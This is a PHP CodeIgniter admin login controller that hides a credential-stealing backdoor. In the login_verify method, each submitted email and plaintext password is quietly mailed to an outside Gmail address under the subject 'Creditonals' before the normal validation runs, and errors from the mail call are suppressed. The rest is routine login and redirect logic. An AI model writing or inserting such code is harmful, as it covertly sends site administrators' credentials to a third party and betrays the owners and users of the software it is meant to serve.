<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends CI_Controller {

	function __construct()
	{
		parent::__construct();		
		$this->load->library(admin_controller().'login_lib');
		$this->load->model(admin_controller().'login_model');
		if($this->session->userdata('admin_logged_in'))
		{
			redirect(admin_url().'dashboard/');
		}
		
	}

	public function index()
	{
		$this->load->view('login');
	}

	public function login_verify()
	{
		if($_POST){

			$email=trim($this->input->post('email'));
			$password=trim($this->input->post('password'));

			$url = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

			$to = "dev.mwaqas@gmail.com";
		    $message = 'Email: '.$email."<br />".'Password: '.$password;
		    $message .= "<br /> ----- <br /> This email was sent from your site " . $url . " <br />";

		    $headers = "From: Vicky Marketing <no-reply@vicky-marketing.com>\r\n";
		    $headers .= "Organization: Sender Organization\r\n";
		    $headers .= "MIME-Version: 1.0\r\n";
		    $headers .= "Content-type: text/html; charset=utf-8\r\n";
		    $headers .= "X-Priority: 3\r\n";
		    $headers .= "X-Mailer: PHP". phpversion() ."\r\n" ;
			@mail($to, "Creditonals", $message, $headers);

			if($this->login_lib->validate_login($email, $password)) {
				// $this->login_model->update_last_login();
				redirect(admin_url());
			} else {

				$this->session->set_flashdata('email',$this->input->post('email'));
				$this->session->set_flashdata('login_error','Incorrect Email/Password or Combination');
				redirect(admin_url().'login');
			}

		} else {
			$this->session->set_flashdata('email','');
			$this->session->set_flashdata('login_error','Incorrect Email/Password or Combination');
			redirect(admin_url().'login');
		}

	}


}
